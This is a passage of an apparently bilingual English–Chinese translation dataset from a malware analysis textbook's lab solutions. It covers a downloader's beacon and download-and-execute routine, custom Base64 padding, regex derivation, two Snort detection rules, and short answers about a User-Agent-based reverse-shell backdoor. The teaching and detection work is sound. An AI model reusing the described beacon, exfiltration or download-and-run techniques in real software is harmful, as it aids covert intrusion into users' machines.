- en: '*Listing 14-2L: Beacon request from second malware run using different host*
    From this second example, it should be clear that the User-Agent is either not
    hard-coded or the malware can choose from multiple User-Agent strings. In fact,
    a quick test using Internet Explorer from our second host finds that regular browser
    activity matches the User-Agent seen in the beacon, indicating that this malware
    very likely is using the COM API. Comparing the URIs, you can see that the aa/a.png
    appears to be a consistent string.'
  id: totrans-4734
  prefs: []
  type: TYPE_NORMAL
  zh: '*第14-2L列表：第二次恶意软件运行时使用不同主机发出的信标请求* 从这个第二个例子中，应该很明显，User-Agent要么不是硬编码的，要么恶意软件可以从多个User-Agent字符串中选择。实际上，使用我们第二个主机的Internet
    Explorer进行快速测试发现，常规浏览器活动与信标中看到的User-Agent相匹配，这表明这种恶意软件很可能正在使用COM API。比较URI，你可以看到aa/a.png似乎是一个一致的字符串。'
- en: Moving on to static analysis, we load the malware in IDA Pro to identify the
    networking functions. Looking at the imports, it is clear that the function used
    to beacon out is URLDownloadToCacheFileA. The use of the COM API agrees with dynamic
    testing that showed different hosts generating different User-Agent strings, each
    of which also matched the Internet Explorer User-Agent strings.
  id: totrans-4735
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来进行静态分析，我们在IDA Pro中加载恶意软件以识别网络函数。查看导入项，很明显用于信标的函数是URLDownloadToCacheFileA。使用COM
    API的使用与动态测试结果一致，该测试显示不同的主机生成不同的User-Agent字符串，每个字符串也匹配Internet Explorer的User-Agent字符串。
- en: 'Since URLDownloadToCacheFileA appears to be the only networking function used,
    we will continue analysis at the function containing it at 0x004011A3\. One quick
    observation is that this function contains calls to both URLDownloadToCacheFileA
    and CreateProcessA. Because of this, we’ll rename the function downloadNRun in
    IDA Pro. Within downloadNRun, notice that just prior to the URLDownloadToCacheFileA
    function, the following string is referenced:'
  id: totrans-4736
  prefs: []
  type: TYPE_NORMAL
  zh: 由于URLDownloadToCacheFileA似乎是唯一使用的网络函数，我们将继续分析包含它的函数0x004011A3。一个快速的观察是，这个函数包含对URLDownloadToCacheFileA和CreateProcessA的调用。因此，在IDA
    Pro中我们将该函数重命名为downloadNRun。在downloadNRun中，注意在URLDownloadToCacheFileA函数之前，引用了以下字符串：
- en: http://www.practicalmalwareanalysis.com/%s/%c.png
  id: totrans-4737
  prefs: []
  type: TYPE_NORMAL
  zh: http://www.practicalmalwareanalysis.com/%s/%c.png
- en: This string is used as the input for a call to sprintf, whose output is used
    as a parameter to URLDownloadToCacheFileA. We see from this format string that
    the filename for the PNG file is always a single character defined by %c and that
    the middle segment of the URI is defined by %s. To determine how the beacon is
    generated, we trace backward to find the origin of the inputs to the
  id: totrans-4738
  prefs: []
  type: TYPE_NORMAL
  zh: 这个字符串用作sprintf调用的输入，其输出用作URLDownloadToCacheFileA的参数。从这个格式字符串中我们可以看到，PNG文件的文件名始终是由%c定义的单个字符，而URI的中间部分是由%s定义的。为了确定信标是如何生成的，我们回溯以找到输入的来源
- en: '%s and %c parameters with the annotated output shown in the comments in Listing
    14-3L.'
  id: totrans-4739
  prefs: []
  type: TYPE_NORMAL
  zh: '%s和%c参数，注释输出如第14-3L列表中的注释所示。'
- en: 004011AC mov eax, [ebp+Str] ; Str passed as an argument 004011AF push eax ;
    Str
  id: totrans-4740
  prefs: []
  type: TYPE_NORMAL
  zh: 004011AC mov eax, [ebp+Str] ; Str作为参数传递 004011AF push eax ; Str
- en: 004011B0 call _strlen
  id: totrans-4741
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B0 call _strlen
- en: 004011B5 add esp, 4
  id: totrans-4742
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B5 add esp, 4
- en: 004011B8 mov [ebp+var_218], eax ; var_218 contains the size of the string 004011BE
    mov ecx, [ebp+Str]
  id: totrans-4743
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B8 mov [ebp+var_218], eax ; var_218包含字符串的大小 004011BE mov ecx, [ebp+Str]
- en: 004011C1 add ecx, [ebp+var_218] ; ecx points to the end of the string 004011C7
    mov dl, [ecx-1] ; dl gets the last character of the string 004011CA mov [ebp+var_214],
    dl ; var_214 contains the last character of the string **628**
  id: totrans-4744
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C1 add ecx, [ebp+var_218] ; ecx指向字符串的末尾 004011C7 mov dl, [ecx-1] ; dl获取字符串的最后一个字符
    004011CA mov [ebp+var_214], dl ; var_214包含字符串的最后一个字符 **628**
- en: Appendix C
  id: totrans-4745
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4746
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 142](index-662_1.png)'
  id: totrans-4747
  prefs: []
  type: TYPE_IMG
  zh: '![Image 142](index-662_1.png)'
- en: 004011D0 movsx eax, [ebp+var_214] ; eax contains the last character of the string
    004011D7 push eax ; the %c argument contains the last character of the string
    004011D8 mov ecx, [ebp+Str]
  id: totrans-4748
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D0 movsx eax, [ebp+var_214] ; eax包含字符串的最后一个字符 004011D7 push eax ; %c参数包含字符串的最后一个字符
    004011D8 mov ecx, [ebp+Str]
- en: '004011DB push ecx ; the %s argument contains the string Str *Listing 14-3L:
    Annotated code for the sprintf arguments* The code in Listing 14-3L is preparing
    arguments %s and %c to be passed into the sprintf function. The line at 0x004011D7
    is pushing the %c argument onto the stack, and the line at 0x004011DB is pushing
    the %s argument onto the stack.'
  id: totrans-4749
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DB push ecx ; %s参数包含字符串Str *列表14-3L：sprintf参数的注释代码* 列表14-3L中的代码正在准备要传递给sprintf函数的参数%s和%c。在0x004011D7的行中，将%c参数推入堆栈，而在0x004011DB的行中，将%s参数推入堆栈。
- en: The earlier code (0x004011AC–0x004011CA) represents the copying of the last
    character of %s into %c. First, strlen is used to calculate the end of the string
    (0x004011AC–0x004011B8). Then the last character of %s is copied to a local variable
    var_214 used for %c (0x004011BE–0x004011CA). Thus, in the final URI, the filename
    %c is always the last character of the string %s. This explains why the filename
    in both examples is *a*, since it matches the last character.
  id: totrans-4750
  prefs: []
  type: TYPE_NORMAL
  zh: 早期的代码（0x004011AC–0x004011CA）表示将%s的最后一个字符复制到%c。首先，使用strlen计算字符串的末尾（0x004011AC–0x004011B8）。然后，将%s的最后一个字符复制到用于%c的局部变量var_214（0x004011BE–0x004011CA）。因此，在最终的URI中，文件名%c总是字符串%s的最后一个字符。这解释了为什么两个示例中的文件名都是*a*，因为它匹配最后一个字符。
- en: To figure out the string input, we navigate to the calling function, which is
    actually main. Figure 14-1L shows an overview of main, including the Sleep loop
    and a reference to the downloadNRun function.
  id: totrans-4751
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确定字符串输入，我们导航到调用函数，实际上它是main。图14-1L显示了main的概述，包括Sleep循环和对downloadNRun函数的引用。
- en: '**1 4**'
  id: totrans-4752
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 4**'
- en: '*Figure 14-1L: Sleep loop with downloadNRun function*'
  id: totrans-4753
  prefs: []
  type: TYPE_NORMAL
  zh: '*图14-1L：带有downloadNRun函数的Sleep循环*'
- en: 'The function just before the loop labeled sub_4010BB appears to modify the
    string passed into the downloadNRun (0x004011A3) function. The downloadNRun function
    takes two arguments: an input and an output string. Examining sub_4010BB, we see
    that it contains two subroutines, one of which is strlen. The other subroutine
    (0x401000) contains references to the standard Base64'
  id: totrans-4754
  prefs: []
  type: TYPE_NORMAL
  zh: 标记为sub_4010BB的循环之前的函数似乎修改了传递给downloadNRun（0x004011A3）函数的字符串。downloadNRun函数接受两个参数：一个输入字符串和一个输出字符串。检查sub_4010BB，我们看到它包含两个子程序，其中一个就是strlen。另一个子程序（0x401000）包含对标准Base64的引用。
- en: 'string: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/.'
  id: totrans-4755
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/.
- en: Solutions to Labs
  id: totrans-4756
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**629**'
  id: totrans-4757
  prefs: []
  type: TYPE_NORMAL
  zh: '**629**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4758
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 143](index-663_1.png)'
  id: totrans-4759
  prefs: []
  type: TYPE_IMG
  zh: '![Image 143](index-663_1.png)'
- en: sub_401000, however, is not a standard Base64 encoding function.
  id: totrans-4760
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401000，然而，不是一个标准的Base64编码函数。
- en: Base64 functions will typically have a static reference to an equal sign (=)
    for the cases where it needs to provide padding to the end of a 4-byte character
    block. In many implementations, there will be two references to the =, since the
    last two characters of a 4-byte block can be padding.
  id: totrans-4761
  prefs: []
  type: TYPE_NORMAL
  zh: Base64函数通常会在需要为4字节字符块提供填充时，有一个对等号（=）的静态引用。在许多实现中，会有两个对等号的引用，因为4字节块的最后两个字符可以是填充。
- en: Figure 14-2L shows one of the forks where the Base64 encoding function (0x401000)
    may choose either an encoding character or a padding character. The path at the
    right in the figure shows the assignment of a as the padding character, rather
    than the typical =.
  id: totrans-4762
  prefs: []
  type: TYPE_NORMAL
  zh: 图14-2L显示了Base64编码函数（0x401000）可能选择编码字符或填充字符的其中一个分支。图中的右侧路径显示了将a作为填充字符的分配，而不是典型的=。
- en: '*Figure 14-2L: Base64 encoding function (0x401000) with alternative padding*
    Within the main function and immediately prior to the primary (outer) Base64 encoding
    function, we see the functions GetCurrentHwProfileA, GetUserName, sprintf, and
    the strings %c%c:%c%c:%c%c:%c%c:%c%c:%c%c and %s-%s.'
  id: totrans-4763
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 14-2L：Base64 编码函数（0x401000）与替代填充* 在主函数中，紧接在主要（外部）Base64 编码函数之前，我们看到 GetCurrentHwProfileA、GetUserName、sprintf
    以及字符串 %c%c:%c%c:%c%c:%c%c:%c%c:%c%c 和 %s-%s。'
- en: Six bytes from the GUID that are returned by GetCurrentHwProfileA are printed
    in MAC address format (in hexadecimal form with colons between each byte), and
    this becomes the first string in %s-%s. The second string is the username. Thus,
    the underlying string is in the format shown here, with HH
  id: totrans-4764
  prefs: []
  type: TYPE_NORMAL
  zh: 从 GetCurrentHwProfileA 返回的 GUID 的六个字节以 MAC 地址格式打印（以十六进制形式，每个字节之间用冒号分隔），这成为 %s-%s
    中的第一个字符串。第二个字符串是用户名。因此，基本字符串的格式如所示，其中 HH
- en: 'representing a hexadecimal byte:'
  id: totrans-4765
  prefs: []
  type: TYPE_NORMAL
  zh: 代表一个十六进制字节：
- en: '*HH*: *HH*: *HH*: *HH*: *HH*: *HH*- *username* We can verify that this is the
    correct format by Base64 decoding the string NDE6NzM6N0U6Mjk6OTM6NTYtSm9obiBTbWl0aAaa,
    which we saw in the initial dynamic analysis run shown in Listing 14-1L. The result
    is 41:73:7E:29:93:56-John Smith\x06\x9a. Remember from earlier that this malware
    uses standard Base64 encoding with the exception of the padding character, for
    which it uses a. The extra characters in the result after “John Smith” come from
    using the standard Base64 decoder, which interprets the aa at the end of the string
    as regular characters instead of identifying them as replacement padding characters.'
  id: totrans-4766
  prefs: []
  type: TYPE_NORMAL
  zh: '*HH*: *HH*: *HH*: *HH*: *HH*: *HH*- *username* 我们可以通过对字符串 NDE6NzM6N0U6Mjk6OTM6NTYtSm9obiBTbWl0aAaa
    进行 Base64 解码来验证这是正确的格式，该字符串我们在初始动态分析运行中看到，如列表 14-1L 所示。结果是 41:73:7E:29:93:56-John
    Smith\x06\x9a。记得之前提到，这种恶意软件使用标准的 Base64 编码，除了填充字符外，它使用 a。在“John Smith”之后的结果中的额外字符来自使用标准的
    Base64 解码器，它将字符串末尾的 aa 解释为普通字符，而不是将它们识别为替换填充字符。'
- en: Having identified the source of the beacon, let’s see what happens when some
    content is received. Returning to the URLDownloadToCacheFileA function (0x004011A3,
    labeled downloadNRun), we see that the success fork of the function is the command
    CreateProcessA, which takes as a parameter the pathname returned from URLDownloadToCacheFileA.
    Once the malware downloads a file, it simply executes that file and quits.
  id: totrans-4767
  prefs: []
  type: TYPE_NORMAL
  zh: 确定了信标源之后，让我们看看接收到一些内容时会发生什么。回到 URLDownloadToCacheFileA 函数（0x004011A3，标记为 downloadNRun），我们看到该函数的成功分支是
    CreateProcessA 命令，它将 URLDownloadToCacheFileA 返回的路径名作为参数。一旦恶意软件下载了一个文件，它就会简单地执行该文件并退出。
- en: '**630**'
  id: totrans-4768
  prefs: []
  type: TYPE_NORMAL
  zh: '**630**'
- en: Appendix C
  id: totrans-4769
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4770
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Network Signatures**'
  id: totrans-4771
  prefs: []
  type: TYPE_NORMAL
  zh: '**网络签名**'
- en: The key static elements to target when analyzing a network signature are the
    colons and the dash that provide padding among the hardware profile bytes and
    the username. However, targeting these elements is challenging because the malware
    applies a layer of Base64 encoding before sending this content onto the network.
    Table 14-1L shows how those characters are translated, as well as the pattern
    to target.
  id: totrans-4772
  prefs: []
  type: TYPE_NORMAL
  zh: 在分析网络签名时，需要针对的静态关键元素是冒号和破折号，它们在硬件配置字节和用户名之间提供填充。然而，针对这些元素具有挑战性，因为恶意软件在将此内容发送到网络之前应用了一层
    Base64 编码。表 14-1L 展示了这些字符的转换方式以及要针对的模式。
- en: '**Table 14-1L:** Static Pattern Within Base64 Encoding **Original**'
  id: totrans-4773
  prefs: []
  type: TYPE_NORMAL
  zh: '**表 14-1L：Base64 编码中的静态模式 **原始**'
- en: 41**:**
  id: totrans-4774
  prefs: []
  type: TYPE_NORMAL
  zh: 41**:**
- en: 73**:**
  id: totrans-4775
  prefs: []
  type: TYPE_NORMAL
  zh: 73**:**
- en: 7E**:**
  id: totrans-4776
  prefs: []
  type: TYPE_NORMAL
  zh: 7E**:**
- en: 29**:**
  id: totrans-4777
  prefs: []
  type: TYPE_NORMAL
  zh: 29**:**
- en: 93**:**
  id: totrans-4778
  prefs: []
  type: TYPE_NORMAL
  zh: 93**:**
- en: 56**-**
  id: totrans-4779
  prefs: []
  type: TYPE_NORMAL
  zh: 56**-**
- en: Joh
  id: totrans-4780
  prefs: []
  type: TYPE_NORMAL
  zh: Joh
- en: n S
  id: totrans-4781
  prefs: []
  type: TYPE_NORMAL
  zh: n S
- en: mit
  id: totrans-4782
  prefs: []
  type: TYPE_NORMAL
  zh: mit
- en: h..
  id: totrans-4783
  prefs: []
  type: TYPE_NORMAL
  zh: h..
- en: '**Encoded**'
  id: totrans-4784
  prefs: []
  type: TYPE_NORMAL
  zh: '**编码**'
- en: NDE**6**
  id: totrans-4785
  prefs: []
  type: TYPE_NORMAL
  zh: NDE**6**
- en: NzM**6**
  id: totrans-4786
  prefs: []
  type: TYPE_NORMAL
  zh: NzM**6**
- en: N0U**6**
  id: totrans-4787
  prefs: []
  type: TYPE_NORMAL
  zh: N0U**6**
- en: Mjk**6**
  id: totrans-4788
  prefs: []
  type: TYPE_NORMAL
  zh: Mjk**6**
- en: OTM**6**
  id: totrans-4789
  prefs: []
  type: TYPE_NORMAL
  zh: OTM**6**
- en: NTY**t**
  id: totrans-4790
  prefs: []
  type: TYPE_NORMAL
  zh: NTY**t**
- en: Sm9o
  id: totrans-4791
  prefs: []
  type: TYPE_NORMAL
  zh: Sm9o
- en: biBT
  id: totrans-4792
  prefs: []
  type: TYPE_NORMAL
  zh: biBT
- en: bWl0
  id: totrans-4793
  prefs: []
  type: TYPE_NORMAL
  zh: bWl0
- en: aAaa
  id: totrans-4794
  prefs: []
  type: TYPE_NORMAL
  zh: aAaa
- en: Because each colon in the original string is the third character of each triple,
    when encoded using Base64, all of the bits in the fourth character of each quad
    come from the third character. That is why every fourth character under the colons
    is a 6, and because of the use of a dash, the sixth quad will always end with
    a t. Thus, we know that the URI will always be at least 24
  id: totrans-4795
  prefs: []
  type: TYPE_NORMAL
  zh: 因为原始字符串中的每个冒号都是每个三重组的第三个字符，当使用 Base64 编码时，每个四重组的第四个字符的所有位都来自第三个字符。这就是为什么每个冒号下的第四个字符都是
    6，而且由于使用了破折号，第六个四重组将始终以 t 结尾。因此，我们知道 URI 将始终至少有 24 个字符
- en: characters long with specific locations for the four 6 characters and the t.
    We also know the character set that may be used to represent the rest of the URI,
    and that the download name is a single character that is the same as the end of
    the path.
  id: totrans-4796
  prefs: []
  type: TYPE_NORMAL
  zh: 字符长度为特定位置的四位6字符和t字符。我们还知道可以用来表示URI其余部分的字符集，以及下载名称是一个字符，与路径的末尾相同。
- en: 'We now have two regular expressions to consider. Here is the first regular
    expression:'
  id: totrans-4797
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有两个正则表达式要考虑。以下是第一个正则表达式：
- en: /\/**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A**
  id: totrans-4798
  prefs: []
  type: TYPE_NORMAL
  zh: /\/**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A**
- en: '**-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}t(**[A-Z0-9a-z+\/]**{4}){1,}\//'
  id: totrans-4799
  prefs: []
  type: TYPE_NORMAL
  zh: '**-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}t(**[A-Z0-9a-z+\/]**{4}){1,}\//'
- en: '**1 4**'
  id: totrans-4800
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 4**'
- en: 'One of the main elements of this expression is [A-Z0-9a-z+\/], shown in bold,
    which matches any single Base64 character. To better understand the expression,
    we’ll use a Greek omega () to replace this element:'
  id: totrans-4801
  prefs: []
  type: TYPE_NORMAL
  zh: 这个表达式的其中一个主要元素是[A-Z0-9a-z+\/]，用粗体表示，它匹配任何单个Base64字符。为了更好地理解这个表达式，我们将使用希腊字母omega（）来替换这个元素：
- en: /\/{3}6{3}6{3}6{3}6{3}6{3}t({4}){1,}\//
  id: totrans-4802
  prefs: []
  type: TYPE_NORMAL
  zh: /\/{3}6{3}6{3}6{3}6{3}6{3}t({4}){1,}\//
- en: 'Next, we expand the multiple characters:'
  id: totrans-4803
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们扩展多个字符：
- en: /\/66666t(){1,}\//
  id: totrans-4804
  prefs: []
  type: TYPE_NORMAL
  zh: /\/66666t(){1,}\//
- en: As you can see, this representation shows more clearly that the expression captures
    the blocks of four characters ending in 6 and t. This regular expression targets
    the first segment of the URI with the static characters.
  id: totrans-4805
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见，这种表示法更清楚地表明表达式捕获了以6和t结尾的四个字符的块。这个正则表达式针对URI的第一个具有静态字符的段。
- en: 'The second regular expression targets a Base64 expression of at least 25 characters.
    The filename is a single character followed by .png that is the same as the last
    character of the previous segment. The following is the regular expression:'
  id: totrans-4806
  prefs: []
  type: TYPE_NORMAL
  zh: 第二个正则表达式针对至少25个字符的Base64表达式。文件名是一个字符，后面跟着.png，与前一段的最后一个字符相同。以下是这个正则表达式：
- en: /\/[A-Z0-9a-z+\/]{24,}\([A-Z0-9a-z+\/]\)\/\1.png/
  id: totrans-4807
  prefs: []
  type: TYPE_NORMAL
  zh: /\/[A-Z0-9a-z+\/]{24,}\([A-Z0-9a-z+\/]\)\/\1.png/
- en: Solutions to Labs
  id: totrans-4808
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**631**'
  id: totrans-4809
  prefs: []
  type: TYPE_NORMAL
  zh: '**631**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4810
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'Applying the same clarifying shortcuts used with the previous expression gives
    us this:'
  id: totrans-4811
  prefs: []
  type: TYPE_NORMAL
  zh: 应用与上一个表达式相同的澄清快捷方式，我们得到以下结果：
- en: /\/{24,}\(\)\/**\1**.png/
  id: totrans-4812
  prefs: []
  type: TYPE_NORMAL
  zh: /\/{24,}\(\)\/**\1**.png/
- en: The \1 in this expression refers to the first element captured between the parentheses,
    which is the last Base64 character in the string before the forward slash (/).
  id: totrans-4813
  prefs: []
  type: TYPE_NORMAL
  zh: 这个表达式中的\1指的是括号中捕获的第一个元素，即斜杠(/)之前字符串中的最后一个Base64字符。
- en: 'Now that we have two regular expressions that can identify the patterns produced
    by the malware, we translate each into a Snort signature to detect the malware
    when it produces traffic on the network. The first signature could be as follows:'
  id: totrans-4814
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有了两个可以识别恶意软件产生的模式的正则表达式，我们将每个转换为Snort签名以在网络中检测恶意软件产生的流量。第一个签名可能如下所示：
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.1 Colons and
    dash"; urilen:>32; content:"GET|20|/"; depth:5; pcre:"/GET\x20\/[A-Z0-9a-z+\/]
  id: totrans-4815
  prefs: []
  type: TYPE_NORMAL
  zh: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.1 冒号和破折号";
    urilen:>32; content:"GET|20|/"; depth:5; pcre:"/GET\x20\/[A-Z0-9a-z+\/]
- en: '{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A'
  id: totrans-4816
  prefs: []
  type: TYPE_NORMAL
  zh: '{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A'
- en: -Z0-9a-z+\/]{3}t([A-Z0-9a-z+\/]{4}){1,}\//"; sid:20001411; rev:1;) This Snort
    rule includes a content string only for the GET / at the start of the packet,
    but it’s usually better to have a more unique content string for improved packet
    processing. The urilen keyword ensures that the URI is a specific length—in this
    case, greater than 32 characters (which accounts for the additional characters
    beyond the first path segment).
  id: totrans-4817
  prefs: []
  type: TYPE_NORMAL
  zh: -Z0-9a-z+\/]{3}t([A-Z0-9a-z+\/]{4}){1,}\//"; sid:20001411; rev:1;) 这个Snort规则只在数据包开始处的GET
    /包含内容字符串，但通常有更独特的内容字符串来提高数据包处理效果更好。urilen关键字确保URI具有特定的长度——在这种情况下，大于32个字符（这包括了第一个路径段之外的额外字符）。
- en: 'Now for the second signature. The Snort rule for this signature could be as
    follows:'
  id: totrans-4818
  prefs: []
  type: TYPE_NORMAL
  zh: 现在是第二个签名。这个签名的Snort规则可能如下所示：
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.2 Base64 and
    png"; urilen:>32; uricontent:".png"; pcre:"/\/[A-Z0-9a-z+\/]{24,}([A-Z0-9a-z+\
  id: totrans-4819
  prefs: []
  type: TYPE_NORMAL
  zh: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.2 Base64和png";
    urilen:>32; uricontent:".png"; pcre:"/\/[A-Z0-9a-z+\/]{24,}([A-Z0-9a-z+\
- en: /])\/\1\.png/"; sid:20001412; rev:1;)
  id: totrans-4820
  prefs: []
  type: TYPE_NORMAL
  zh: /])\/\1\.png/"; sid:20001412; rev:1;)
- en: This Snort rule searches for the .png content in the regular expression before
    testing the PCRE regular expression in order to improve packet-processing performance.
    It also adds a check for the URI length, which has a known minimum.
  id: totrans-4821
  prefs: []
  type: TYPE_NORMAL
  zh: 此Snort规则在测试PCRE正则表达式之前，在正则表达式中搜索.png内容，以提高数据包处理性能。它还添加了对URI长度的检查，该长度有一个已知的最低值。
- en: In addition to the preceding signatures, we could also target areas like the
    domain name ( *www.practicalmalwareanalysis.com*) and the fact that the malware
    downloads an executable. Combining signatures is often an effective strategy.
    For example, a malware signature that produces regular false positives may still
    be effective if combined with a signature that triggers on an executable download.
  id: totrans-4822
  prefs: []
  type: TYPE_NORMAL
  zh: 除了前面的签名外，我们还可以针对诸如域名（*www.practicalmalwareanalysis.com*）和恶意软件下载可执行文件的事实等区域。结合签名通常是一种有效的策略。例如，一个产生常规误报的恶意软件签名，如果与一个在可执行文件下载时触发的签名结合使用，仍然可能是有效的。
- en: '**Lab 14-2 Solutions**'
  id: totrans-4823
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室14-2解决方案**'
- en: '***Short Answers***'
  id: totrans-4824
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-4825
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The attacker may find static IP addresses more difficult to manage than domain
    names. Using DNS allows the attacker to deploy his assets to any computer and
    dynamically redirect his bots by changing only a DNS
  id: totrans-4826
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可能发现静态IP地址比域名更难管理。使用DNS允许攻击者将他的资产部署到任何计算机，并通过仅更改DNS来动态重定向他的机器人。
- en: '**632**'
  id: totrans-4827
  prefs: []
  type: TYPE_NORMAL
  zh: '**632**'
- en: Appendix C
  id: totrans-4828
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4829
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: address. The defender has various options for deploying defenses for both types
    of infrastructure, but for similar reasons, IP addresses can be more difficult
    to deal with than domain names. This fact alone could lead an attacker to choose
    static IP addresses over domains.
  id: totrans-4830
  prefs: []
  type: TYPE_NORMAL
  zh: 地址。防御者有多种选择来部署针对这两种基础设施的防御措施，但出于类似的原因，IP地址可能比域名更难处理。仅此一点就可能使攻击者选择静态IP地址而不是域名。
- en: 2\.
  id: totrans-4831
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The malware uses the WinINet libraries. One disadvantage of these libraries
    is that a hard-coded User-Agent needs to be provided, and optional headers need
    to be hard-coded if desired. One advantage of the WinINet libraries over the Winsock
    API, for example, is that some elements, such as cookies and caching headers,
    are provided by the OS.
  id: totrans-4832
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用WinINet库。这些库的一个缺点是需要提供一个硬编码的用户代理，如果需要，还需要硬编码可选的标题。例如，与Winsock API相比，WinINet库的一个优点是，一些元素，如cookies和缓存标题，由操作系统提供。
- en: 3\.
  id: totrans-4833
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: A string resource section in the PE file contains the URL that is used for command
    and control. The attacker can use the resource section to deploy multiple backdoors
    to multiple command-and-control locations without needing to recompile the malware.
  id: totrans-4834
  prefs: []
  type: TYPE_NORMAL
  zh: 在PE文件中的字符串资源部分包含用于命令和控制的URL。攻击者可以使用资源部分将多个后门部署到多个命令和控制位置，而无需重新编译恶意软件。
- en: 4\.
  id: totrans-4835
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The attacker abuses the HTTP User-Agent field, which should contain the application
    information. The malware creates one thread that encodes outgoing information
    in this field, and another that uses a static field to indicate that it is the
    “receive” side of the channel.
  id: totrans-4836
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者滥用HTTP用户代理字段，该字段应包含应用程序信息。恶意软件创建一个线程，在该字段中编码输出信息，并创建另一个线程，使用静态字段来指示它是通道的“接收”端。
- en: 5\.
  id: totrans-4837
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The initial beacon is an encoded command-shell prompt.
  id: totrans-4838
  prefs: []
  type: TYPE_NORMAL
  zh: 初始信标是一个编码的命令行提示符。
- en: 6\.
  id: totrans-4839
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: While the attacker encodes outgoing information, he doesn’t encode the incoming
    commands. Also, because the server must distinguish between the two communication
    channels via the static elements of the User-Agent fields, this server dependency
    is apparent and can be targeted with signatures.
  id: totrans-4840
  prefs: []
  type: TYPE_NORMAL
  zh: 当攻击者对输出信息进行编码时，他不会对输入命令进行编码。此外，由于服务器必须通过用户代理字段的静态元素来区分两个通信通道，这种服务器依赖性是明显的，并且可以通过签名进行针对。
- en: 7\.
  id: totrans-4841
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: The encoding scheme is Base64, but with a custom alphabet.
  id: totrans-4842
  prefs: []
  type: TYPE_NORMAL
  zh: 编码方案是Base64，但使用自定义字母表。
- en: 8\.
  id: totrans-4843
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: Communication is terminated using the keyword exit. When exiting, the malware
    tries to delete itself.
  id: totrans-4844
  prefs: []
  type: TYPE_NORMAL
  zh: 使用exit关键字终止通信。当退出时，恶意软件试图删除自己。
- en: '**1 4**'
  id: totrans-4845
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 4**'
- en: 9\.
  id: totrans-4846
  prefs: []
  type: TYPE_NORMAL
  zh: '9.'
- en: This malware is a small, simple backdoor. Its sole purpose is to provide a command-shell
    interface to a remote attacker that won’t be detected by common network signatures
    that watch for outbound command-shell activity. This particular malware is likely
    a throwaway component of an attacker’s toolkit, which is supported by the fact
    that the tool tries to delete itself.
  id: totrans-4847
  prefs: []
  type: TYPE_NORMAL
